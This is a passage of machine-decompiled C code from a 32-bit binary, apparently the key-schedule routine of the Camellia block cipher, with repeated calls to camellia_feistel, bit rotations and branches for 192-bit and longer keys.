                                                    int32_t v151 = v147; // 0x806f14b
                                                    if (v150 != 0) {
                                                        // if_806f149_0_true
                                                        v151 = v147 << (int32_t)v150;
                                                        // branch -> after_if_806f149_0
                                                    }
                                                    // after_if_806f149_0
                                                    *(int32_t *)(v9 + 28) = v151 ^ v149;
                                                    // branch -> 0x806f150
                                                }
                                                // 0x806f150
                                                v23 += 15;
                                                v9 += 16;
                                                int32_t * v152 = (int32_t *)(g2 - 272); // 0x806f156_0
                                                *v152 = *v152 + 1;
                                                if (v23 == 75) {
                                                    // break -> 0x806f166
                                                    break;
                                                }
                                                // continue -> 0x806f0a0
                                            }
                                            int32_t * v153 = (int32_t *)(g2 - 284); // 0x806f166_0
                                            v9 = 0;
                                            int32_t v154 = *(int32_t *)(g2 - 292); // 0x806f16e
                                            v111 = v154;
                                            int32_t v155 = 16 * (*v153 + 4 * *v153) + (int32_t)&g177; // 0x806f180
                                            v112 = v155;
                                            int32_t v156 = 0; // 0x806f190
                                            // branch -> 0x806f188
                                            while (true) {
                                                char v157 = *(char *)v155; // 0x806f188
                                                int32_t v158 = *(int32_t *)(v22 + 4 * v156); // 0x806f190
                                                *(int32_t *)(v154 + 4 + 4 * (int32_t)v157) = v158;
                                                int32_t v159 = v9 + 1; // 0x806f19a
                                                v9 = v159;
                                                int32_t v160 = v112 + 1; // 0x806f19d
                                                v112 = v160;
                                                if (v159 == 20) {
                                                    // 0x806f1a5
                                                    v118 = g2;
                                                    // branch -> 0x806f1a5
                                                    // 0x806f1a5
                                                    v23 = 15;
                                                    *(int32_t *)(v118 - 292) = v111;
                                                    *(int32_t *)(g2 - 268) = *(int32_t *)(v118 - 156);
                                                    v119 = g2;
                                                    *(int32_t *)(v119 - 264) = *(int32_t *)(v119 - 152);
                                                    v120 = g2;
                                                    *(int32_t *)(v120 - 260) = *(int32_t *)(v120 - 148);
                                                    v121 = g2;
                                                    *(int32_t *)(v121 - 256) = *(int32_t *)(v121 - 144);
                                                    v122 = g2;
                                                    v125 = *(int32_t *)(v122 - 284);
                                                    *(int32_t *)(v122 - 272) = 8 * (2 * v125 | 1) + (int32_t)&g175;
                                                    v9 = v22;
                                                    // branch -> 0x806f1fa
                                                    while (true) {
                                                        // 0x806f1fa
                                                        v123 = g2;
                                                        v124 = v123;
                                                        if (*(char *)*(int32_t *)(v123 - 272) != 0) {
                                                          lab_0x806f209:
                                                            // 0x806f209
                                                            *(int32_t *)(v123 - 276) = v23 % 32;
                                                            int32_t v161 = 32 - *(int32_t *)(g2 - 276); // 0x806f225
                                                            *(int32_t *)(g2 - 280) = v161;
                                                            uint32_t v162 = v161 % 32; // 0x806f231
                                                            int32_t v163 = *(int32_t *)(v123 - 264); // 0x806f231
                                                            int32_t v164 = v163; // 0x806f243
                                                            if (v162 != 0) {
                                                                // if_806f231_0_true
                                                                v164 = v163 >> v162;
                                                                // branch -> after_if_806f231_0
                                                            }
                                                            unsigned char v165 = *(char *)(g2 - 276) % 32;
                                                            int32_t v166 = *(int32_t *)(v123 - 268); // 0x806f23a
                                                            int32_t v167 = v166; // 0x806f243
                                                            if (v165 != 0) {
                                                                // if_806f23a_0_true
                                                                v167 = v166 << (int32_t)v165;
                                                                // branch -> after_if_806f23a_0
                                                            }
                                                            // after_if_806f23a_0
                                                            *(int32_t *)(v9 + 16) = v167 ^ v164;
                                                            uint32_t v168 = *(int32_t *)(g2 - 260); // 0x806f248
                                                            int32_t v169 = *(int32_t *)(g2 - 264); // 0x806f24e
                                                            unsigned char v170 = *(char *)(g2 - 280) % 32;
                                                            int32_t v171 = v168; // 0x806f266
                                                            if (v170 != 0) {
                                                                // if_806f254_0_true
                                                                v171 = v168 >> (int32_t)v170;
                                                                // branch -> after_if_806f254_0
                                                            }
                                                            unsigned char v172 = *(char *)(g2 - 276) % 32;
                                                            int32_t v173 = v169; // 0x806f266
                                                            if (v172 != 0) {
                                                                // if_806f25d_0_true
                                                                v173 = v169 << (int32_t)v172;
                                                                // branch -> after_if_806f25d_0
                                                            }
                                                            // after_if_806f25d_0
                                                            *(int32_t *)(v9 + 20) = v173 ^ v171;
                                                            uint32_t v174 = *(int32_t *)(g2 - 256); // 0x806f26b
                                                            int32_t v175 = *(int32_t *)(g2 - 260); // 0x806f271
                                                            unsigned char v176 = *(char *)(g2 - 280) % 32;
                                                            int32_t v177 = v174; // 0x806f289
                                                            if (v176 != 0) {
                                                                // if_806f277_0_true
                                                                v177 = v174 >> (int32_t)v176;
                                                                // branch -> after_if_806f277_0
                                                            }
                                                            unsigned char v178 = *(char *)(g2 - 276) % 32;
                                                            int32_t v179 = v175; // 0x806f289
                                                            if (v178 != 0) {
                                                                // if_806f280_0_true
                                                                v179 = v175 << (int32_t)v178;
                                                                // branch -> after_if_806f280_0
                                                            }
                                                            // after_if_806f280_0
                                                            *(int32_t *)(v9 + 24) = v179 ^ v177;
                                                            uint32_t v180 = *(int32_t *)(g2 - 268); // 0x806f28e
                                                            int32_t v181 = *(int32_t *)(g2 - 256); // 0x806f294
                                                            unsigned char v182 = *(char *)(g2 - 280) % 32;
                                                            int32_t v183 = v180; // 0x806f2a5
                                                            if (v182 != 0) {
                                                                // if_806f29a_0_true
                                                                v183 = v180 >> (int32_t)v182;
                                                                // branch -> after_if_806f29a_0
                                                            }
                                                            unsigned char v184 = *(char *)(g2 - 276) % 32;
                                                            int32_t v185 = v181; // 0x806f2a5
                                                            if (v184 != 0) {
                                                                // if_806f2a3_0_true
                                                                v185 = v181 << (int32_t)v184;
                                                                // branch -> after_if_806f2a3_0
                                                            }
                                                            // after_if_806f2a3_0
                                                            *(int32_t *)(v9 + 28) = v185 ^ v183;
                                                            v124 = g2;
                                                            // branch -> 0x806f2aa
                                                        }
                                                      lab_0x806f2aa:
                                                        // 0x806f2aa
                                                        v23 += 15;
                                                        v9 += 16;
                                                        int32_t * v186 = (int32_t *)(v124 - 272); // 0x806f2b0_0
                                                        *v186 = *v186 + 1;
                                                        if (v23 == 75) {
                                                            // break -> 0x806f2c0
                                                            break;
                                                        }
                                                        // continue -> 0x806f1fa
                                                    }
                                                    int32_t * v187 = (int32_t *)(g2 - 284); // 0x806f2c0_0
                                                    v9 = 0;
                                                    int32_t v188 = *(int32_t *)(g2 - 292); // 0x806f2c8
                                                    v111 = v188;
                                                    int32_t v189 = 16 * (*v187 + 4 * *v187) + (int32_t)&g178; // 0x806f2da
                                                    v112 = v189;
                                                    int32_t v190 = 0; // 0x806f2e8
                                                    // branch -> 0x806f2e0
                                                    while (true) {
                                                        char v191 = *(char *)v189; // 0x806f2e0
                                                        int32_t v192 = *(int32_t *)(v22 + 4 * v190); // 0x806f2e8
                                                        *(int32_t *)(v188 + 4 + 4 * (int32_t)v191) = v192;
                                                        int32_t v193 = v9 + 1; // 0x806f2f2
                                                        v9 = v193;
                                                        int32_t v194 = v112 + 1; // 0x806f2f5
                                                        v112 = v194;
                                                        if (v193 == 20) {
                                                            // 0x806f2fd
                                                            int32_t v195; // 0x806f4b9
                                                            int32_t v196; // 0x806f4bc
                                                            int32_t v197; // 0x806f47e
                                                            int32_t * v198; // 0x806f46d_0
                                                            int32_t v199;
                                                            int32_t v200;
                                                            int32_t v201;
                                                            int32_t v202;
                                                            char v203; // 0x806f4a8
                                                            int32_t v204; // 0x806f49b
                                                            int32_t v205; // 0x806f48a
                                                            int32_t v206; // 0x806f49b
                                                            int32_t v207; // 0x806f4b3
                                                            if (*(int32_t *)(g2 + 16) >= 129) {
                                                                // 0x806f30a
                                                                v23 = 15;
                                                                *(int32_t *)(g2 - 288) = v111;
                                                                v111 = *(int32_t *)(g2 - 296);
                                                                *(int32_t *)(g2 - 268) = *(int32_t *)(g2 - 140);
                                                                *(int32_t *)(g2 - 264) = *(int32_t *)(g2 - 136);
                                                                *(int32_t *)(g2 - 260) = *(int32_t *)(g2 - 132);
                                                                *(int32_t *)(g2 - 256) = *(int32_t *)(g2 - 128);
                                                                int32_t v208 = *(int32_t *)(g2 - 284); // 0x806f348
                                                                *(int32_t *)(g2 - 272) = (16 * v208 | 12) + (int32_t)&g175;
                                                                // branch -> 0x806f360
                                                                while (true) {
                                                                    // 0x806f360
                                                                    if (*(char *)*(int32_t *)(g2 - 272) != 0) {
                                                                        uint32_t v209 = v23 % 32; // 0x806f37c
                                                                        *(int32_t *)(g2 - 276) = v209;
                                                                        *(int32_t *)(g2 - 280) = 32 - v209;
                                                                        uint32_t v210 = *(int32_t *)(g2 - 264); // 0x806f38d
                                                                        char * v211 = (char *)(g2 - 280); // 0x806f393_0
                                                                        unsigned char v212 = *v211 % 32;
                                                                        int32_t v213 = v210; // 0x806f3ac
                                                                        if (v212 != 0) {
                                                                            // if_806f39a_0_true
                                                                            v213 = v210 >> (int32_t)v212;
                                                                            // branch -> after_if_806f39a_0
                                                                        }
                                                                        unsigned char v214 = *(char *)(g2 - 276) % 32;
                                                                        int32_t v215 = *(int32_t *)(g2 - 268); // 0x806f3a3
                                                                        int32_t v216 = v215; // 0x806f3ac
                                                                        if (v214 != 0) {
                                                                            // if_806f3a3_0_true
                                                                            v216 = v215 << (int32_t)v214;
                                                                            // branch -> after_if_806f3a3_0
                                                                        }
                                                                        // after_if_806f3a3_0
                                                                        *(int32_t *)(v111 + 16) = v216 ^ v213;
                                                                        uint32_t v217 = *(int32_t *)(g2 - 260); // 0x806f3b1
                                                                        int32_t v218 = *(int32_t *)(g2 - 264); // 0x806f3b7
                                                                        unsigned char v219 = *v211 % 32;
                                                                        int32_t v220 = v217; // 0x806f3cf
                                                                        if (v219 != 0) {
                                                                            // if_806f3bd_0_true
                                                                            v220 = v217 >> (int32_t)v219;
                                                                            // branch -> after_if_806f3bd_0
                                                                        }
                                                                        unsigned char v221 = *(char *)(g2 - 276) % 32;
                                                                        int32_t v222 = v218; // 0x806f3cf
                                                                        if (v221 != 0) {
                                                                            // if_806f3c6_0_true
                                                                            v222 = v218 << (int32_t)v221;
                                                                            // branch -> after_if_806f3c6_0
                                                                        }
                                                                        // after_if_806f3c6_0
                                                                        *(int32_t *)(v111 + 20) = v222 ^ v220;
                                                                        uint32_t v223 = *(int32_t *)(g2 - 256); // 0x806f3d4
                                                                        int32_t v224 = *(int32_t *)(g2 - 260); // 0x806f3da
                                                                        unsigned char v225 = *(char *)(g2 - 280) % 32;
                                                                        int32_t v226 = v223; // 0x806f3f2
                                                                        if (v225 != 0) {
                                                                            // if_806f3e0_0_true
                                                                            v226 = v223 >> (int32_t)v225;
                                                                            // branch -> after_if_806f3e0_0
                                                                        }
                                                                        unsigned char v227 = *(char *)(g2 - 276) % 32;
                                                                        int32_t v228 = v224; // 0x806f3f2
                                                                        if (v227 != 0) {
                                                                            // if_806f3e9_0_true
                                                                            v228 = v224 << (int32_t)v227;
                                                                            // branch -> after_if_806f3e9_0
                                                                        }
                                                                        // after_if_806f3e9_0
                                                                        *(int32_t *)(v111 + 24) = v228 ^ v226;
                                                                        uint32_t v229 = *(int32_t *)(g2 - 268); // 0x806f3f7
                                                                        int32_t v230 = *(int32_t *)(g2 - 256); // 0x806f3fd
                                                                        unsigned char v231 = *(char *)(g2 - 280) % 32;
                                                                        int32_t v232 = v229; // 0x806f40e
                                                                        if (v231 != 0) {
                                                                            // if_806f403_0_true
                                                                            v232 = v229 >> (int32_t)v231;
                                                                            // branch -> after_if_806f403_0
                                                                        }
                                                                        unsigned char v233 = *(char *)(g2 - 276) % 32;
                                                                        int32_t v234 = v230; // 0x806f40e
                                                                        if (v233 != 0) {
                                                                            // if_806f40c_0_true
                                                                            v234 = v230 << (int32_t)v233;
                                                                            // branch -> after_if_806f40c_0
                                                                        }
                                                                        // after_if_806f40c_0
                                                                        *(int32_t *)(v111 + 28) = v234 ^ v232;
                                                                        // branch -> 0x806f413
                                                                    }
                                                                    // 0x806f413
                                                                    v23 += 15;
                                                                    v111 += 16;
                                                                    int32_t * v235 = (int32_t *)(g2 - 272); // 0x806f419_0
                                                                    *v235 = *v235 + 1;
                                                                    if (v23 == 75) {
                                                                        // break -> 0x806f429
                                                                        break;
                                                                    }
                                                                    // continue -> 0x806f360
                                                                }
                                                                int32_t * v236 = (int32_t *)(g2 - 284); // 0x806f429_0
                                                                v9 = 0;
                                                                int32_t v237 = *(int32_t *)(g2 - 288); // 0x806f431
                                                                v111 = v237;
                                                                int32_t v238 = 16 * (*v236 + 4 * *v236) + (int32_t)&g179; // 0x806f443
                                                                v112 = v238;
                                                                int32_t v239 = 0; // 0x806f458
                                                                // branch -> 0x806f450
                                                                while (true) {
                                                                    char v240 = *(char *)v238; // 0x806f450
                                                                    int32_t v241 = *(int32_t *)(v22 + 4 * v239); // 0x806f458
                                                                    *(int32_t *)(v237 + 4 + 4 * (int32_t)v240) = v241;
                                                                    int32_t v242 = v9 + 1; // 0x806f462
                                                                    v9 = v242;
                                                                    int32_t v243 = v112 + 1; // 0x806f465
                                                                    v112 = v243;
                                                                    if (v242 == 20) {
                                                                        // 0x806f46d
                                                                        // branch -> 0x806f46d
                                                                        // 0x806f46d
                                                                        v198 = (int32_t *)(g2 - 284);
                                                                        v197 = *v198 + 2 * *v198;
                                                                        v205 = 4 * (*v198 + 4 * *v198) + (int32_t)&g180;
                                                                        v9 = v205;
                                                                        v204 = v111;
                                                                        v206 = 16 * v197 + 132 + v204;
                                                                        v22 = v206;
                                                                        int32_t v244 = v206; // 0x806f4b7
                                                                        int32_t v245 = v204; // 0x806f4b3
                                                                        int32_t v246 = v205; // 0x806f4a8
                                                                        // branch -> 0x806f4a8
                                                                        while (true) {
                                                                            // 0x806f4a8
                                                                            v203 = *(char *)v246;
                                                                            v207 = *(int32_t *)(v245 + 4 + 4 * (int32_t)v203);
                                                                            *(int32_t *)v244 = v207;
                                                                            v195 = v22 + 4;
                                                                            v22 = v195;
                                                                            v196 = v9 + 1;
                                                                            v9 = v196;
                                                                            if (v195 == v204 + 212 + 16 * v197) {
                                                                                // 0x806f4c3
                                                                                g3 = v199;
                                                                                g7 = v200;
                                                                                g5 = v201;
                                                                                g2 = v202;
                                                                                return 0;
                                                                            }
                                                                          lab_0x806f4a8:
                                                                            // 0x806f4a8
                                                                            v244 = v195;
                                                                            v245 = v111;
                                                                            v246 = v196;
                                                                            // branch -> 0x806f4a8
                                                                        }
                                                                    } else {
                                                                        // 0x806f450
                                                                        v237 = v111;
                                                                        v239 = v242;
                                                                        v238 = v243;
                                                                        // branch -> 0x806f450
                                                                        continue;
                                                                    }
                                                                }
                                                            }
                                                            // 0x806f46d
                                                            v198 = (int32_t *)(g2 - 284);
                                                            v197 = *v198 + 2 * *v198;
                                                            v205 = 4 * (*v198 + 4 * *v198) + (int32_t)&g180;
                                                            v204 = v111;
                                                            v206 = 16 * v197 + 132 + v204;
                                                            // branch -> 0x806f4a8
                                                            while (true) {
                                                                // 0x806f4a8
                                                                v203 = *(char *)v205;
                                                                v207 = *(int32_t *)(v204 + 4 + 4 * (int32_t)v203);
                                                                *(int32_t *)v206 = v207;
                                                                v195 = v206 + 4;
                                                                v22 = v195;
                                                                v196 = v205 + 1;
                                                                v9 = v196;
                                                                if (v195 != v204 + 212 + 16 * v197) {
                                                                    goto lab_0x806f4a8;
                                                                }
                                                                // 0x806f4c3
                                                                g3 = v199;
                                                                g7 = v200;
                                                                g5 = v201;
                                                                g2 = v202;
                                                                return 0;
                                                            }
                                                        } else {
                                                            // 0x806f2e0
                                                            v188 = v111;
                                                            v190 = v193;
                                                            v189 = v194;
                                                            // branch -> 0x806f2e0
                                                            continue;
                                                        }
                                                    }
                                                } else {
                                                    // 0x806f188
                                                    v154 = v111;
                                                    v156 = v159;
                                                    v155 = v160;
                                                    // branch -> 0x806f188
                                                    continue;
                                                }
                                            }
                                        }
                                        // 0x806f1a5
                                        v23 = 15;
                                        *(int32_t *)(v118 - 292) = v111;
                                        *(int32_t *)(g2 - 268) = *(int32_t *)(v118 - 156);
                                        v119 = g2;
                                        *(int32_t *)(v119 - 264) = *(int32_t *)(v119 - 152);
                                        v120 = g2;
                                        *(int32_t *)(v120 - 260) = *(int32_t *)(v120 - 148);
                                        v121 = g2;
                                        *(int32_t *)(v121 - 256) = *(int32_t *)(v121 - 144);
                                        v122 = g2;
                                        v125 = *(int32_t *)(v122 - 284);
                                        *(int32_t *)(v122 - 272) = 8 * (2 * v125 | 1) + (int32_t)&g175;
                                        v9 = v22;
                                        // branch -> 0x806f1fa
                                        while (true) {
                                            // 0x806f1fa
                                            v123 = g2;
                                            if (*(char *)*(int32_t *)(v123 - 272) == 0) {
                                                v124 = v123;
                                                goto lab_0x806f2aa;
                                            }
                                            goto lab_0x806f209;
                                        }
                                    } else {
                                        // 0x806f020
                                        v113 = v116;
                                        v112 = v117;
                                        // branch -> 0x806f020
                                        continue;
                                    }
                                }
                            } else {
                              lab_0x806edd8_5:
                                // 0x806edd8
                                v82 = v12;
                                v83 = v47;
                                v29 = v67;
                                // branch -> 0x806edd8
                                continue;
                            }
                        }
                    } else {
                      lab_0x806ed50_5:
                        // 0x806ed50
                        v80 = g6;
                        v81 = v11;
                        // branch -> 0x806ed50
                        continue;
                    }
                }
            }
            // 0x806ed4b
            v22 = 0;
            v16 = &v28;
            g6 = v16;
            // branch -> 0x806ed50
            while (true) {
                // 0x806ed50
                v62 = 0;
                v69 = *(char *)(v62 + (int32_t)&g167);
                v70 = *(char *)(v62 + (int32_t)&g168);
                v71 = *(char *)(v62 + (int32_t)&g170);
                v72 = *(char *)(v62 + (int32_t)&g169);
                v73 = *(char *)(v62 + (int32_t)&g172);
                *(int32_t *)(v62 + v16) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
                v63 = 8 * v22;
                v74 = *(char *)(v63 + (int32_t)&g171);
                v75 = *(char *)(v63 + (int32_t)&g174);
                v76 = *(char *)(v63 + (int32_t)&g173);
                *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
                v11 = v22 + 1;
                v22 = v11;
                if (v11 != 6) {
                    goto lab_0x806ed50_5;
                }
                // 0x806edbd
                v29 = &v27;
                // branch -> 0x806edd8
                while (true) {
                    // 0x806edd8
                    set_mem = (int32_t)memset((char *)v29, (int32_t)&v24, 16);
                    v46 = v8;
                    v68 = 4 * set_mem;
                    v64 = *(char *)(v68 + v46);
                    v77 = *(char *)((v68 | 1) + v46);
                    v78 = *(char *)((v68 | 3) + v46);
                    v79 = *(char *)((v68 | 2) + v46);
                    v67 = 256 * (int32_t)v79;
                    v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
                    *(int32_t *)(v68 - 188 + v3) = v47;
                    v12 = set_mem + 1;
                    if (v12 != 8) {
                        goto lab_0x806edd8_5;
                    }
                    // 0x806ee09
                    v30 = v3;
                    v48 = v30 - 188;
                    g3 = v48;
                    v49 = v48;
                    v65 = *(int32_t *)(v49 + 16);
                    *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                    v13 = g3 + 4;
                    g3 = v13;
                    // branch -> 0x806ee15
                    while (v13 != v30 - 172) {
                        // 0x806ee15
                        v49 = v13;
                        v65 = *(int32_t *)(v49 + 16);
                        *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                        v13 = g3 + 4;
                        g3 = v13;
                        // continue -> 0x806ee15
                    }
                    // 0x806ee24
                    v31 = v3;
                    v50 = v31 - 156;
                    g5 = v50;
                    g4 = v31 - 148;
                    g1 = v50;
                    camellia_feistel(v1, a2, a3);
                    v51 = g2;
                    g6 = v51 - 52;
                    g4 = g5;
                    g1 = v51 - 148;
                    camellia_feistel(v1, a2, a3);
                    v32 = g2;
                    g6 = v32 - 44;
                    v17 = (int32_t *)(v32 - 156);
                    *v17 = *v17 ^ *(int32_t *)(v32 - 188);
                    v33 = g2;
                    g4 = v33 - 148;
                    v18 = (int32_t *)(v33 - 152);
                    *v18 = *v18 ^ *(int32_t *)(v33 - 184);
                    v34 = g2;
                    v19 = (int32_t *)(v34 - 148);
                    *v19 = *v19 ^ *(int32_t *)(v34 - 180);
                    v35 = g2;
                    v20 = (int32_t *)(v35 - 144);
                    *v20 = *v20 ^ *(int32_t *)(v35 - 176);
                    g1 = g5;
                    camellia_feistel(v1, a2, a3);
                    v52 = g2;
                    g6 = v52 - 36;
                    g4 = g5;
                    g1 = v52 - 148;
                    camellia_feistel(v1, a2, a3);
                    v53 = g2;
                    v37 = v53;
                    if (*(int32_t *)(v53 + 16) >= 129) {
                        // 0x806eea0
                        v54 = g3;
                        v66 = *(int32_t *)(v54 + 16);
                        *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                        v14 = g3 + 4;
                        g3 = v14;
                        // branch -> 0x806eea9
                        while (v14 != v53 - 156) {
                            // 0x806eea9
                            v54 = v14;
                            v66 = *(int32_t *)(v54 + 16);
                            *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                            v14 = g3 + 4;
                            g3 = v14;
                            // continue -> 0x806eea9
                        }
                        // 0x806eeb8
                        v36 = g2;
                        v55 = v36 - 132;
                        g5 = v55;
                        v56 = v36 - 140;
                        g3 = v56;
                        g4 = v55;
                        g6 = v36 - 28;
                        g1 = v56;
                        camellia_feistel(v1, a2, a3);
                        g6 = g2 - 20;
                        g4 = g3;
                        g1 = g5;
                        camellia_feistel(v1, a2, a3);
                        v37 = g2;
                        // branch -> 0x806eedc
                    }
                    // 0x806eedc
                    v23 = 15;
                    *(int32_t *)(v37 - 292) = g7;
                    *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
                    v38 = g2;
                    *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
                    v39 = g2;
                    *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
                    v40 = g2;
                    *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
                    v41 = g2;
                    v59 = *(int32_t *)(v41 - 284);
                    *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
                    v42 = g2;
                    v57 = v42 - 268;
                    v22 = v57;
                    *(int32_t *)(v42 - 296) = v57;
                    v9 = v22;
                    // branch -> 0x806ef39
                    while (true) {
                        // 0x806ef39
                        v43 = g2;
                        if (*(char *)*(int32_t *)(v43 - 272) == 0) {
                            v44 = v43;
                            goto lab_0x806efe9_5;
                        }
                        goto lab_0x806ef48_5;
                    }
                }
            }
        }
        // 0x806f4d0
        *(int32_t *)g7 = 4;
        // branch -> 0x806ed2e
        // 0x806ed2e
        v60 = 0;
        v61 = *(char *)(v9 + v60);
        *(char *)(v8 + v60) = v61;
        v10 = 1;
        // branch -> 0x806ed30
        while (a3 / 8 > v10) {
            // 0x806ed30
            v60 = v10;
            v61 = *(char *)(v9 + v60);
            *(char *)(v8 + v60) = v61;
            v10++;
            // continue -> 0x806ed30
        }
        // 0x806ed3e
        if (a3 == 192) {
            // 0x806f4eb
            v21 = &v26;
            v58 = v21;
            v45 = *(char *)v58;
            *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
            v15 = v21 + 1;
            // branch -> 0x806f4f8
            while (v15 != (int32_t)&v25) {
                // 0x806f4f8
                v58 = v15;
                v45 = *(char *)v58;
                *(char *)(v58 + 8) = (char)(-1 - (int32_t)v45);
                v15++;
                // continue -> 0x806f4f8
            }
            // 0x806ed4b
            v22 = 0;
            v16 = &v28;
            g6 = v16;
            // branch -> 0x806ed50
            while (true) {
                // 0x806ed50
                v62 = 0;
                v69 = *(char *)(v62 + (int32_t)&g167);
                v70 = *(char *)(v62 + (int32_t)&g168);
                v71 = *(char *)(v62 + (int32_t)&g170);
                v72 = *(char *)(v62 + (int32_t)&g169);
                v73 = *(char *)(v62 + (int32_t)&g172);
                *(int32_t *)(v62 + v16) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
                v63 = 8 * v22;
                v74 = *(char *)(v63 + (int32_t)&g171);
                v75 = *(char *)(v63 + (int32_t)&g174);
                v76 = *(char *)(v63 + (int32_t)&g173);
                *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
                v11 = v22 + 1;
                v22 = v11;
                if (v11 != 6) {
                    goto lab_0x806ed50_5;
                }
                // 0x806edbd
                v29 = &v27;
                // branch -> 0x806edd8
                while (true) {
                    // 0x806edd8
                    set_mem = (int32_t)memset((char *)v29, (int32_t)&v24, 16);
                    v46 = v8;
                    v68 = 4 * set_mem;
                    v64 = *(char *)(v68 + v46);
                    v77 = *(char *)((v68 | 1) + v46);
                    v78 = *(char *)((v68 | 3) + v46);
                    v79 = *(char *)((v68 | 2) + v46);
                    v67 = 256 * (int32_t)v79;
                    v47 = v67 | 0x10000 * (int32_t)v77 | 0x1000000 * (int32_t)v64 | (int32_t)v78;
                    *(int32_t *)(v68 - 188 + v3) = v47;
                    v12 = set_mem + 1;
                    if (v12 != 8) {
                        goto lab_0x806edd8_5;
                    }
                    // 0x806ee09
                    v30 = v3;
                    v48 = v30 - 188;
                    g3 = v48;
                    v49 = v48;
                    v65 = *(int32_t *)(v49 + 16);
                    *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                    v13 = g3 + 4;
                    g3 = v13;
                    // branch -> 0x806ee15
                    while (v13 != v30 - 172) {
                        // 0x806ee15
                        v49 = v13;
                        v65 = *(int32_t *)(v49 + 16);
                        *(int32_t *)(v49 + 32) = *(int32_t *)v49 ^ v65;
                        v13 = g3 + 4;
                        g3 = v13;
                        // continue -> 0x806ee15
                    }
                    // 0x806ee24
                    v31 = v3;
                    v50 = v31 - 156;
                    g5 = v50;
                    g4 = v31 - 148;
                    g1 = v50;
                    camellia_feistel(v1, a2, a3);
                    v51 = g2;
                    g6 = v51 - 52;
                    g4 = g5;
                    g1 = v51 - 148;
                    camellia_feistel(v1, a2, a3);
                    v32 = g2;
                    g6 = v32 - 44;
                    v17 = (int32_t *)(v32 - 156);
                    *v17 = *v17 ^ *(int32_t *)(v32 - 188);
                    v33 = g2;
                    g4 = v33 - 148;
                    v18 = (int32_t *)(v33 - 152);
                    *v18 = *v18 ^ *(int32_t *)(v33 - 184);
                    v34 = g2;
                    v19 = (int32_t *)(v34 - 148);
                    *v19 = *v19 ^ *(int32_t *)(v34 - 180);
                    v35 = g2;
                    v20 = (int32_t *)(v35 - 144);
                    *v20 = *v20 ^ *(int32_t *)(v35 - 176);
                    g1 = g5;
                    camellia_feistel(v1, a2, a3);
                    v52 = g2;
                    g6 = v52 - 36;
                    g4 = g5;
                    g1 = v52 - 148;
                    camellia_feistel(v1, a2, a3);
                    v53 = g2;
                    v37 = v53;
                    if (*(int32_t *)(v53 + 16) >= 129) {
                        // 0x806eea0
                        v54 = g3;
                        v66 = *(int32_t *)(v54 + 16);
                        *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                        v14 = g3 + 4;
                        g3 = v14;
                        // branch -> 0x806eea9
                        while (v14 != v53 - 156) {
                            // 0x806eea9
                            v54 = v14;
                            v66 = *(int32_t *)(v54 + 16);
                            *(int32_t *)(v54 + 32) = *(int32_t *)v54 ^ v66;
                            v14 = g3 + 4;
                            g3 = v14;
                            // continue -> 0x806eea9
                        }
                        // 0x806eeb8
                        v36 = g2;
                        v55 = v36 - 132;
                        g5 = v55;
                        v56 = v36 - 140;
                        g3 = v56;
                        g4 = v55;
                        g6 = v36 - 28;
                        g1 = v56;
                        camellia_feistel(v1, a2, a3);
                        g6 = g2 - 20;
                        g4 = g3;
                        g1 = g5;
                        camellia_feistel(v1, a2, a3);
                        v37 = g2;
                        // branch -> 0x806eedc
                    }
                    // 0x806eedc
                    v23 = 15;
                    *(int32_t *)(v37 - 292) = g7;
                    *(int32_t *)(g2 - 268) = *(int32_t *)(v37 - 188);
                    v38 = g2;
                    *(int32_t *)(v38 - 264) = *(int32_t *)(v38 - 184);
                    v39 = g2;
                    *(int32_t *)(v39 - 260) = *(int32_t *)(v39 - 180);
                    v40 = g2;
                    *(int32_t *)(v40 - 256) = *(int32_t *)(v40 - 176);
                    v41 = g2;
                    v59 = *(int32_t *)(v41 - 284);
                    *(int32_t *)(v41 - 272) = 16 * v59 + (int32_t)&g175;
                    v42 = g2;
                    v57 = v42 - 268;
                    v22 = v57;
                    *(int32_t *)(v42 - 296) = v57;
                    v9 = v22;
                    // branch -> 0x806ef39
                    while (true) {
                        // 0x806ef39
                        v43 = g2;
                        if (*(char *)*(int32_t *)(v43 - 272) == 0) {
                            v44 = v43;
                            goto lab_0x806efe9_5;
                        }
                        goto lab_0x806ef48_5;
                    }
                }
            }
        }
        // 0x806ed4b
        v22 = 0;
        v16 = &v28;
        g6 = v16;
        // branch -> 0x806ed50
        while (true) {
            // 0x806ed50
            v62 = 0;
            v69 = *(char *)(v62 + (int32_t)&g167);
            v70 = *(char *)(v62 + (int32_t)&g168);
            v71 = *(char *)(v62 + (int32_t)&g170);
            v72 = *(char *)(v62 + (int32_t)&g169);
            v73 = *(char *)(v62 + (int32_t)&g172);
            *(int32_t *)(v62 + v16) = 256 * (int32_t)v72 | 0x10000 * (int32_t)v70 | 0x1000000 * (int32_t)v69 | (int32_t)v71;
            v63 = 8 * v22;
            v74 = *(char *)(v63 + (int32_t)&g171);
            v75 = *(char *)(v63 + (int32_t)&g174);
            v76 = *(char *)(v63 + (int32_t)&g173);
            *(int32_t *)((v63 | 4) + g6) = 256 * (int32_t)v76 | 0x1000000 * (int32_t)v74 | 0x10000 * (int32_t)v73 | (int32_t)v75;
            v11 = v22 + 1;
            v22 = v11;
            if (v11 != 6) {
                goto lab_0x806ed50_5;
            }
            // 0x806edbd
